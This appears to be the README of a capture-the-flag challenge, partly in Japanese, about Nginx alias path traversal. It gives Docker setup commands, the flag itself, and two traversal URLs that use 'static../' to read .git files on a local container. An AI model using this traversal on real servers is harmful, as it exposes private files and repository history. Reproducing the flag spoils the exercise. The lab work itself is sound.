# Nginx alias traversal

## 環境構築

```
$ docker build -t nginx-revenge .
$ docker run -d -p 127.0.0.1:8000:80 nginx-revenge:latest
```

## Exploit
gitのコミットメッセージがflagになっている
`flag{ng1nx_r3v3ng3_m4tch}`

http://localhost:8000/static../.git/logs/refs/heads/master

or

http://localhost:8000/static../.git/COMMIT_EDITMSG
